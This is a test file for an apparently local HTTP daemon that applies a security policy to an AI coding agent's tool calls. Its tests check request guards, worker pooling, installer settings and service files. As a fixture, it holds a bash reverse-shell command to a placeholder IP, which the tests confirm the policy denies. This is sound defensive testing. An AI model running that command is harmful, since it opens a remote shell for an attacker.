// Per-file runner:  node --test --import ./test/hermetic-env.mjs test/hookd-http.test.mjs
//
// moorai-hookd (cli/moorai-hookd.mjs) and its parts: the request guards (bearer token, loopback Host, body cap),
// the exit-code-to-HTTP mapping (cli/hook-http.mjs), the warm pool (cli/hook-warm-pool.mjs: parallel requests,
// queue cap, retiring workers when the code changes), state read per request (enrollment changed after the
// workers are warm), the agent pid the parent-process walk starts from, the installer's http entries and the
// generated service files. The decision parity with the command hook is test/hookd-parity.test.mjs.
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawn, spawnSync } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, statSync, utimesSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import http from "node:http";
import { rmTree } from "./fs-cleanup.mjs";
import { createHookd, parseArgs } from "../cli/moorai-hookd.mjs";
import { mapHookResult, workerHeader, projectDirFor, encodeProjectDir, envHeader } from "../cli/hook-http.mjs";
import { createPool } from "../cli/hook-warm-pool.mjs";
import { hookImports } from "../cli/hook-warm-worker.mjs";
import { httpHandler, onFailureFor, strengthenOnFailure, installedTransport } from "../cli/hook-transport.mjs";
import { unitFor } from "../cli/hookd-unit.mjs";
import { allowlistProblem, checkHookTransport } from "../cli/doctor-hookd.mjs";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const HOOK = join(ROOT, "cli", "moorai-hook.mjs");
const HOOKD = join(ROOT, "cli", "moorai-hookd.mjs");
const BEARER = "hookd-http-test-bearer-0123456789";
const REVSHELL = "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1";

const home = () => { const h = mkdtempSync(join(tmpdir(), "moorai-hookd-")); mkdirSync(join(h, ".moorai"), { recursive: true }); return h; };
const envOf = (h, extra = {}) => ({ PATH: process.env.PATH || "/usr/bin:/bin", HOME: h, USERPROFILE: h, XDG_CONFIG_HOME: join(h, ".config"), XDG_STATE_HOME: join(h, ".local", "state"), ...extra });
const pre = (h, command, extra = {}) => ({ hook_event_name: "PreToolUse", session_id: "s-hookd", transcript_path: "", cwd: h, permission_mode: "default", tool_name: "Bash", tool_input: { command }, tool_use_id: "tu-1", ...extra });
function req(url, { method = "POST", path = "/v1/hook/claude-code", headers = {}, body = "" } = {}) {
  return new Promise((res, rej) => {
    const u = new URL(path, url);
    const r = http.request({ host: u.hostname, port: u.port, path: u.pathname, method, headers: { "content-type": "application/json", authorization: `Bearer ${BEARER}`, ...headers } }, (resp) => {
      let b = ""; resp.on("data", (d) => (b += d)); resp.on("end", () => res({ status: resp.statusCode, body: b }));
    });
    r.on("error", rej);
    r.end(body);
  });
}
function consoleServer(policy) {
  const alerts = [];
  const srv = http.createServer((q, s) => {
    let body = ""; q.on("data", (d) => (body += d));
    q.on("end", () => {
      if (q.url.startsWith("/api/policy/pubkey")) { s.writeHead(404); return s.end(); }
      if (q.url.startsWith("/api/policy")) { s.writeHead(200, { "content-type": "application/json" }); return s.end(JSON.stringify(policy)); }
      if (q.method === "POST" && q.url.startsWith("/api/alerts")) { try { const j = JSON.parse(body); for (const a of Array.isArray(j) ? j : Array.isArray(j.alerts) ? j.alerts : [j]) alerts.push(a); } catch { /* not an alert */ } }
      s.writeHead(201); s.end("{}");
    });
  });
  return new Promise((r) => srv.listen(0, "127.0.0.1", () => r({ url: `http://127.0.0.1:${srv.address().port}`, alerts, close: () => srv.close() })));
}

test("request guards: no or wrong token 401, a non-loopback Host 421, an over-size body 413, a non-JSON body 415", async () => {
  const h = home();
  const d = await createHookd({ port: 0, token: BEARER, workers: 1, maxWorkers: 2, maxBody: 2048, env: envOf(h) });
  try {
    const body = JSON.stringify(pre(h, "ls"));
    assert.equal((await req(d.url, { headers: { authorization: "" }, body })).status, 401, "no token");
    assert.equal((await req(d.url, { headers: { authorization: "Bearer not-the-token-0123456789" }, body })).status, 401, "wrong token");
    assert.equal((await req(d.url, { headers: { host: "evil.example:80" }, body })).status, 421, "DNS-rebinding Host");
    assert.equal((await req(d.url, { body: JSON.stringify(pre(h, "x".repeat(4096))) })).status, 413, "over --max-body");
    assert.equal((await req(d.url, { headers: { "content-type": "text/plain" }, body })).status, 415, "not application/json");
    assert.equal((await req(d.url, { path: "/v1/other", body })).status, 404);
    assert.equal((await req(d.url, { method: "GET" })).status, 405);
    const ok = await req(d.url, { body });
    assert.equal(ok.status, 200, ok.body);
    const hz = JSON.parse((await req(d.url, { method: "GET", path: "/healthz" })).body);
    assert.equal(hz.transport, "http");
  } finally { await d.close(); rmTree(h); }
});

test("parseArgs: loopback only, bounded numbers", () => {
  assert.throws(() => parseArgs(["--host", "0.0.0.0"]), /loopback only/);
  assert.throws(() => parseArgs(["--workers", "2", "--max-workers", "1"]), /--max-workers/);
  assert.equal(parseArgs([]).port, 8793);
});

test("exit code and output map to the HTTP answer Claude Code reads the same way (hooks reference, Exit code 2 / HTTP response handling)", () => {
  const deny = JSON.stringify({ hookSpecificOutput: { hookEventName: "PreToolUse", permissionDecision: "deny", permissionDecisionReason: "MoorAI: no" } });
  assert.deepEqual(mapHookResult({ hook_event_name: "PreToolUse" }, { code: 0, stdout: `${deny}\n`, stderr: "" }), { status: 200, body: deny });
  assert.deepEqual(mapHookResult({ hook_event_name: "PreToolUse" }, { code: 0, stdout: "", stderr: "noise" }), { status: 200, body: "" });
  // exit 2: the JSON's own blocking reason wins over stderr; with no JSON, stderr is the reason.
  assert.deepEqual(JSON.parse(mapHookResult({ hook_event_name: "PreToolUse" }, { code: 2, stdout: deny, stderr: "other" }).body).hookSpecificOutput, { hookEventName: "PreToolUse", permissionDecision: "deny", permissionDecisionReason: "MoorAI: no" });
  assert.deepEqual(JSON.parse(mapHookResult({ hook_event_name: "PreToolUse" }, { code: 2, stdout: "", stderr: "blocked by policy\n" }).body), { hookSpecificOutput: { hookEventName: "PreToolUse", permissionDecision: "deny", permissionDecisionReason: "blocked by policy" } });
  // exit 2 with a JSON allow still blocks ("they can't override the block").
  const allow = JSON.stringify({ hookSpecificOutput: { hookEventName: "PreToolUse", permissionDecision: "allow" } });
  assert.equal(JSON.parse(mapHookResult({ hook_event_name: "PreToolUse" }, { code: 2, stdout: allow, stderr: "nope" }).body).hookSpecificOutput.permissionDecision, "deny");
  for (const ev of ["UserPromptSubmit", "Stop", "SubagentStop", "PreCompact", "PostToolUse"]) assert.deepEqual(JSON.parse(mapHookResult({ hook_event_name: ev }, { code: 2, stdout: "", stderr: "why" }).body), { decision: "block", reason: "why" }, ev);
  assert.deepEqual(JSON.parse(mapHookResult({ hook_event_name: "PostToolUseFailure" }, { code: 2, stdout: "", stderr: "why" }).body), { hookSpecificOutput: { hookEventName: "PostToolUseFailure", additionalContext: "why" } });
  // another exit: JSON decides alone; nothing usable is a non-blocking error (non-2xx)
  assert.deepEqual(mapHookResult({ hook_event_name: "PreToolUse" }, { code: 1, stdout: deny, stderr: "" }), { status: 200, body: deny });
  assert.equal(mapHookResult({ hook_event_name: "PreToolUse" }, { code: 1, stdout: "", stderr: "crash" }).status, 502);
  assert.equal(mapHookResult({ hook_event_name: "PreToolUse" }, { code: null, signal: "SIGKILL", stdout: "", stderr: "" }).status, 502);
  assert.equal(mapHookResult({ hook_event_name: "PreToolUse" }, { code: 0, stdout: "{not json}", stderr: "" }).status, 502);
  // plain text on UserPromptSubmit is context; elsewhere it goes to the debug log only
  assert.deepEqual(JSON.parse(mapHookResult({ hook_event_name: "UserPromptSubmit" }, { code: 0, stdout: "note\n", stderr: "" }).body), { hookSpecificOutput: { hookEventName: "UserPromptSubmit", additionalContext: "note" } });
  assert.deepEqual(mapHookResult({ hook_event_name: "PreToolUse" }, { code: 0, stdout: "note", stderr: "" }), { status: 200, body: "" });
});

test("worker header: forwarded variables are validated, the project dir comes from the header or the transcript path, a missing cwd falls back", () => {
  const h = home();
  try {
    const proj = join(h, "my.proj"), sub = join(proj, "src");
    mkdirSync(sub, { recursive: true });
    const tp = join(h, ".claude", "projects", encodeProjectDir(proj), "s.jsonl");
    assert.equal(projectDirFor({ cwd: sub, transcript_path: tp }, {}), proj);
    assert.equal(projectDirFor({ cwd: sub, transcript_path: "" }, {}), sub);
    const hdr = workerHeader({ cwd: sub, transcript_path: tp }, { [envHeader("AI_AGENT")]: "claude-code_2-1-295_harness", [envHeader("CLAUDE_CONFIG_DIR")]: "relative/dir", [envHeader("CLAUDE_PROJECT_DIR")]: "" }, 123);
    assert.deepEqual(hdr, { cwd: sub, env: { AI_AGENT: "claude-code_2-1-295_harness", CLAUDE_PROJECT_DIR: proj, CLAUDE_CONFIG_DIR: "", CLAUDE_CODE_REMOTE: "" }, peerPid: 123 });
    assert.equal(workerHeader({ cwd: join(h, "gone") }, { [envHeader("CLAUDE_PROJECT_DIR")]: proj }, 0).cwd, proj, "a cwd that no longer exists: the project dir, as Claude Code does");
  } finally { rmTree(h); }
});

test("the warm worker preloads every module the hook names", () => {
  const specs = hookImports(readFileSync(HOOK, "utf8"));
  assert.ok(specs.length > 50, `${specs.length}`);
  assert.ok(specs.includes("./hook-core.mjs") && specs.includes("./model-pins-hook.mjs"), "static and dynamic imports");
  assert.ok(specs.every((s) => existsSync(join(ROOT, "cli", s))));
});

test("pool: parallel calls each get their own worker, past max-workers they queue, past the queue cap 503", async () => {
  const h = home();
  const d = await createHookd({ port: 0, token: BEARER, workers: 1, maxWorkers: 2, env: envOf(h), pool: createPool({ size: 1, max: 2, maxQueue: 1, env: envOf(h) }) });
  try {
    const body = JSON.stringify(pre(h, "ls"));
    const rs = await Promise.all(Array.from({ length: 4 }, () => req(d.url, { body })));
    const by = rs.reduce((m, r) => ((m[r.status] = (m[r.status] || 0) + 1), m), {});
    assert.deepEqual(by, { 200: 3, 503: 1 }, JSON.stringify(rs));
    assert.equal(d.pool.stats.served, 3);
    assert.ok(d.pool.stats.spawned >= 3, "one worker per request, never two requests in one");
  } finally { await d.close(); rmTree(h); }
});

test("pool: waiting workers are retired when the hook's code on disk changes", async () => {
  const h = home();
  const marker = join(h, "code-stamp");
  writeFileSync(marker, "1");
  const pool = createPool({ size: 2, max: 4, env: envOf(h), watch: [marker] });
  try {
    await pool.ready();
    const before = pool.stats.spawned;
    utimesSync(marker, new Date(), new Date(Date.now() + 5000));
    const r = await pool.run(JSON.stringify(pre(h, "ls")), { cwd: h, env: {}, peerPid: 0 });
    assert.equal(r.code, 0);
    assert.ok(pool.stats.retired >= 2, `retired ${pool.stats.retired}`);
    assert.equal(r.warm, false, "the request ran on a worker started after the change");
    assert.ok(pool.stats.spawned > before);
  } finally { await pool.close(); rmTree(h); }
});

test("state is read per request: enrolling after the workers are warm changes the next verdict", async () => {
  const h = home();
  const c = await consoleServer({ captureTier: "content-free", threatPolicy: { 54: "block" } });
  const d = await createHookd({ port: 0, token: BEARER, workers: 2, maxWorkers: 4, maxAgeMs: 600000, env: envOf(h) });
  try {
    await d.pool.ready();
    const before = JSON.parse((await req(d.url, { body: JSON.stringify(pre(h, REVSHELL)) })).body);
    assert.equal(before.hookSpecificOutput.permissionDecision, undefined, `unenrolled: coached, not denied: ${JSON.stringify(before)}`);
    writeFileSync(join(h, ".moorai", "config.json"), JSON.stringify({ serverUrl: c.url, tenant: "hookd-stale", installToken: "tok-hookd-stale" }));
    const r = await req(d.url, { body: JSON.stringify(pre(h, REVSHELL, { tool_use_id: "tu-2" })) });
    assert.equal(r.status, 200);
    const after = JSON.parse(r.body);
    assert.equal(after.hookSpecificOutput.permissionDecision, "deny", `enrolled: denied by the console's policy: ${r.body}`);
    assert.equal(d.pool.stats.warm >= 2, true, "both answers came from workers that were already warm");
  } finally { await d.close(); c.close(); rmTree(h); }
});

test("the parent-process walk starts at the agent on the other end of the connection, not at moorai-hookd", async () => {
  const h = home();
  const c = await consoleServer({ captureTier: "content-free" });
  const env = envOf(h, { MOORAI_MODE: "server", MOORAI_SERVER_URL: c.url, MOORAI_TENANT: "hookd-peer", MOORAI_INSTALL_TOKEN: "tok-hookd-peer", MOORAI_SERVICE_ID: "peer-bot" });
  writeFileSync(join(h, ".moorai", "hookd.token"), `${BEARER}\n`, { mode: 0o600 });
  const d = spawn(process.execPath, [HOOKD, "--port", "0", "--workers", "1", "--token-file", join(h, ".moorai", "hookd.token")], { env, stdio: ["ignore", "pipe", "pipe"] });
  try {
    const url = await new Promise((res, rej) => { let b = ""; d.stdout.on("data", (x) => { b += x; const m = /"listening":"([^"]+)"/.exec(b); if (m) res(m[1]); }); d.on("exit", (code) => rej(new Error(`hookd exited ${code}`))); });
    const r = await req(url, { body: JSON.stringify(pre(h, REVSHELL)) });
    assert.equal(r.status, 200, r.body);
    for (let i = 0; i < 40 && !c.alerts.some((a) => a.workload); i++) await new Promise((x) => setTimeout(x, 250));
    const pids = [...new Set(c.alerts.filter((a) => a.workload).map((a) => a.workload.pid))];
    assert.deepEqual(pids, [process.pid], `alerts name this test process (the HTTP client), not moorai-hookd (${d.pid})`);
  } finally { d.kill(); c.close(); rmTree(h); }
});

test("installer: --hook-transport http writes http entries (0600, token, onFailure from the fail mode), converge keeps them, uninstall removes them", async () => {
  const h = home(), h2 = home();
  const c = await consoleServer({ captureTier: "content-free", failMode: { hook: "closed" } });
  try {
    // Not spawnSync: the hook fetches its policy from the console this process serves.
    const run = (args, env, input = "") => new Promise((res) => { const p = spawn(process.execPath, [HOOK, ...args], { env }); p.stdout.resume(); p.stderr.resume(); p.on("close", (status) => res({ status })); p.stdin.end(input); });
    const read = (x) => JSON.parse(readFileSync(join(x, ".claude", "settings.json"), "utf8"));
    const onFailures = (s, pick) => [...new Set(Object.entries(s.hooks).filter(([ev]) => pick(ev)).flatMap(([, l]) => l.map((e) => e.hooks[0].onFailure)))];
    // Unenrolled: fail mode open.
    assert.equal((await run(["install", "--hook-transport", "http", "--hookd-port", "59999"], envOf(h))).status, 0);
    let s = read(h);
    assert.equal(statSync(join(h, ".claude", "settings.json")).mode & 0o777, 0o600);
    const token = readFileSync(join(h, ".moorai", "hookd.token"), "utf8").trim();
    assert.equal(statSync(join(h, ".moorai", "hookd.token")).mode & 0o777, 0o600);
    for (const [ev, list] of Object.entries(s.hooks)) for (const e of list) {
      assert.equal(e.hooks[0].type, "http", ev);
      assert.equal(e.hooks[0].url, "http://127.0.0.1:59999/v1/hook/claude-code");
      assert.equal(e.hooks[0].headers.Authorization, `Bearer ${token}`);
      assert.equal(e.hooks[0].onFailure, "continue", `${ev}: unenrolled, fail mode open`);
    }
    assert.ok(!Object.keys(s.hooks).includes("SessionStart"));
    // An ordinary hook run converges as http (it would otherwise rewrite the entries as command entries).
    assert.equal((await run([], envOf(h), JSON.stringify(pre(h, "ls")))).status, 0);
    assert.deepEqual(read(h), s);
    assert.equal((await run(["uninstall"], envOf(h))).status, 0);
    assert.deepEqual(Object.values(read(h).hooks).flat(), []);
    assert.notEqual((await run(["install", "--hook-transport", "smoke"], envOf(h))).status, 0, "an unknown transport is refused");
    // A device whose policy sets failMode.hook closed (server mode: the test console's policy is unsigned).
    const server = envOf(h2, { MOORAI_MODE: "server", MOORAI_SERVER_URL: c.url, MOORAI_TENANT: "hookd-inst", MOORAI_INSTALL_TOKEN: "tok-hookd-inst", MOORAI_SERVICE_ID: "inst-bot" });
    assert.equal((await run(["install", "--hook-transport", "http", "--hookd-port", "59999"], server)).status, 0);
    s = read(h2);
    assert.deepEqual(onFailures(s, (ev) => ev === "PreToolUse"), ["block"], "install resolves the closed fail mode");
    assert.deepEqual(onFailures(s, (ev) => ev !== "PreToolUse"), ["continue"]);
    // Entries written while the mode was open are strengthened by the next hook run once it is closed.
    for (const l of Object.values(s.hooks)) for (const e of l) e.hooks[0].onFailure = "continue";
    writeFileSync(join(h2, ".claude", "settings.json"), JSON.stringify(s, null, 2), { mode: 0o600 });
    assert.equal((await run([], server, JSON.stringify(pre(h2, "ls")))).status, 0);
    s = read(h2);
    assert.equal(installedTransport(s, (e) => JSON.stringify(e).includes("moorai-hook")), "http");
    assert.deepEqual(onFailures(s, (ev) => ev === "PreToolUse"), ["block"], "strengthened on the hook's own run");
    assert.deepEqual(onFailures(s, (ev) => ev !== "PreToolUse"), ["continue"]);
  } finally { c.close(); rmTree(h); rmTree(h2); }
});

test("onFailure follows the fail mode on PreToolUse only, and converge only strengthens it", () => {
  assert.equal(onFailureFor("PreToolUse", "closed"), "block");
  assert.equal(onFailureFor("PreToolUse", "open"), "continue");
  assert.equal(onFailureFor("UserPromptSubmit", "closed"), "continue");
  const ours = (e) => JSON.stringify(e).includes("moorai-hook");
  const s = { hooks: { PreToolUse: [{ matcher: "Bash", hooks: [httpHandler({ event: "PreToolUse", token: "t".repeat(64), failMode: "closed" })] }] } };
  assert.equal(strengthenOnFailure(s, ours, "open"), false);
  assert.equal(s.hooks.PreToolUse[0].hooks[0].onFailure, "block", "an open resolution never relaxes a block");
  s.hooks.PreToolUse[0].hooks[0].onFailure = "continue";
  assert.equal(strengthenOnFailure(s, ours, "closed"), true);
  assert.equal(s.hooks.PreToolUse[0].hooks[0].onFailure, "block");
});

test("service files: launchd agent and systemd user unit generated into a throwaway directory (never loaded)", () => {
  const out = mkdtempSync(join(tmpdir(), "moorai-hookd-unit-"));
  try {
    const mac = unitFor({ platform: "darwin", node: "/opt/node dir/bin/node", script: "/x/cli/moorai-hookd.mjs", args: ["--port", "8793"], outDir: out, logFile: "/h/.moorai/hookd.log" });
    assert.match(mac.text, /<string>\/opt\/node dir\/bin\/node<\/string>/);
    assert.match(mac.text, /<key>KeepAlive<\/key>\s*<true\/>/);
    assert.match(mac.install[0], /^launchctl bootstrap gui\/\$\(id -u\) /);
    const lin = unitFor({ platform: "linux", node: "/opt/node dir/bin/node", script: "/x/cli/moorai-hookd.mjs", args: ["--port", "8793"], outDir: out });
    assert.match(lin.text, /^ExecStart="\/opt\/node dir\/bin\/node" \/x\/cli\/moorai-hookd.mjs --port 8793$/m);
    assert.equal(unitFor({ platform: "win32", node: "n", script: "s", outDir: out }), null);
    // The bin writes the file for this platform into --out and prints the install command.
    const h = home();
    const r = spawnSync(process.execPath, [HOOKD, "unit", "--out", out, "--port", "8794"], { env: envOf(h), encoding: "utf8" });
    if (process.platform === "darwin" || process.platform === "linux") {
      assert.equal(r.status, 0, r.stderr);
      const j = JSON.parse(r.stdout);
      assert.ok(existsSync(j.file) && j.file.startsWith(out));
      assert.match(readFileSync(j.file, "utf8"), /8794/);
      if (process.platform === "darwin") assert.equal(spawnSync("/usr/bin/plutil", ["-lint", j.file], { encoding: "utf8" }).status, 0, "a valid plist");
    }
    rmTree(h);
  } finally { rmTree(out); }
});

test("doctor: reports the transport, a moorai-hookd that does not answer, and an allowlist that excludes it", async () => {
  const host = (urls) => ({ installed: true, details: { transport: "http", urls } });
  assert.equal((await checkHookTransport({ installed: true, details: {} })).summary.startsWith("command"), true);
  const dead = await checkHookTransport(host(["http://127.0.0.1:1/v1/hook/claude-code"]), { fetchImpl: async () => { throw new Error("ECONNREFUSED"); } });
  assert.equal(dead.status, "fail");
  assert.match(dead.summary, /does not answer/);
  const live = await checkHookTransport(host(["http://127.0.0.1:8793/v1/hook/claude-code"]), { version: "1.0.0", fetchImpl: async () => ({ ok: true, status: 200, json: async () => ({ status: "ok", version: "1.0.0", workers: { waiting: 2 } }) }) });
  assert.equal(live.status, "ok", live.summary);
  assert.match(allowlistProblem("http://127.0.0.1:8793/v1/hook/claude-code", [{ source: "managed", data: { allowedHttpHookUrls: [] } }]), /does not match/);
  assert.equal(allowlistProblem("http://127.0.0.1:8793/v1/hook/claude-code", [{ source: "user", data: { allowedHttpHookUrls: ["http://127.0.0.1:*"] } }]), "");
});
